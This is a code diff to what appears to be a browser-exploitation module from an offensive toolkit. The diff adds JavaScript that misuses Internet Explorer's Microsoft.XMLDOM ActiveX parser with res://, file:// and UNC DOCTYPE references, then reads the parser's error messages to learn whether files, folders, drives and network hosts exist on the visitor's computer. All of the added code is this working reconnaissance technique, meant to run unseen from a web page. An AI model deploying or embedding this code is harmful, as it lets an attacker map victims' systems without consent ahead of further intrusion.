@@ -1,5 +1,82 @@
 var ie_addons_detect = { };
 
+var XMLDOMRESULTS = {
+  UNKNOWN : {value: 0, message: "Unknown!", color: "black", data: ""}, 
+  BADBROWSER: {value: 1, message: "Browser is not supported. You need IE!", color: "black", data: ""}, 
+  FILEFOUND : {value: 2, message: "File was found!", color: "green", data: ""},
+  FOLDERFOUND : {value: 3, message: "Folder was found!", color: "green", data: ""},
+  NOTFOUND : {value: 4, message: "Object was not found!", color: "red", data: ""},
+  ALIVE : {value: 5, message: "Alive address!", color: "green", data: ""},
+  MAYBEALIVE : {value: 6, message: "Maybe an alive address!", color: "blue", data: ""},
+  DEAD : {value: 7, message: "Dead to me! Undetectable?", color: "red", data: ""},
+  VALIDDRIVE : {value: 8, message: "Available Drive!", color: "green", data: ""},
+  INVALIDDRIVE : {value: 9, message: "Unavailable Drive!", color: "red", data: ""}
+};
+
+ie_addons_detect.validateXML = function (txt) {
+  var result = XMLDOMRESULTS.UNKNOWN;
+  if (window.ActiveXObject) {
+    var xmlDoc = new ActiveXObject("Microsoft.XMLDOM");
+    xmlDoc.async = true;
+    try {
+      xmlDoc.loadXML(txt);
+      if (xmlDoc.parseError.errorCode != 0) {
+        var err;
+        err = "Error Code: " + xmlDoc.parseError.errorCode + "\n";
+        err += "Error Reason: " + xmlDoc.parseError.reason;
+        err += "Error Line: " + xmlDoc.parseError.line;
+        var errReason = xmlDoc.parseError.reason.toLowerCase();
+        if (errReason.search('access is denied') >= 0)  {
+          result = XMLDOMRESULTS.ALIVE;
+        } else if(errReason.search('the system cannot locate the object') >= 0 || errReason.search('the system cannot find the file') >= 0 || errReason.search('the network path was not found') >= 0) {
+          result = XMLDOMRESULTS.NOTFOUND;
+        } else if(errReason!=''){
+          result = XMLDOMRESULTS.FILEFOUND;
+        } else{
+          result = XMLDOMRESULTS.UNKNOWN; // No Error? Unknown!
+        };
+        } else {
+          result = XMLDOMRESULTS.FILEFOUND;
+      }
+    } catch (e) {
+        result = XMLDOMRESULTS.FOLDERFOUND;
+    }
+  } else {
+      result = XMLDOMRESULTS.BADBROWSER;
+  }
+    result.data = "";
+    return result;
+};
+
+
+ie_addons_detect.checkFiles = function (files) {
+  var foundFiles = new Array();
+  // the first one is for all drives, the others are for the C drive only!
+  var preMagics = ["res://","\\\\localhost\\\\", "file:\\\\localhost\\", "file:\\"];
+  // or any other irrelevant ADS! - we do not need this when we use Res://
+  var postMagics = ["::$index_allocation"];
+
+  var templateString = '<?xml version="1.0" ?><\!DOCTYPE anything SYSTEM "$target$">';
+
+  for (var i = 0; i < files.length; i++) {
+    var filename = files[i];
+    if (filename != '') {
+      filename = preMagics[0] + filename; // postMagics can be used too!
+      var result = ie_addons_detect.validateXML(templateString.replace("$target$", filename));
+      if (result == XMLDOMRESULTS.FOLDERFOUND || result == XMLDOMRESULTS.ALIVE) result = XMLDOMRESULTS.UNKNOWN;
+      result.data = filename;
+      if (result.message.search(/file was found/i) > -1) {
+        var trimmedFilename = result.data;
+        // Clean up filenames
+        for (var prem in preMagics)   { trimmedFilename = trimmedFilename.replace(preMagics[prem], ''); }
+        for (var postm in postMagics) { trimmedFilename = trimmedFilename.replace(postMagics[postm], ''); }
+        foundFiles.push(trimmedFilename);
+      }
+    }
+  }
+  return foundFiles;
+};
+
 /**
  * Returns true if this ActiveX is available, otherwise false.
  * Grabbed this directly from browser_autopwn.rb
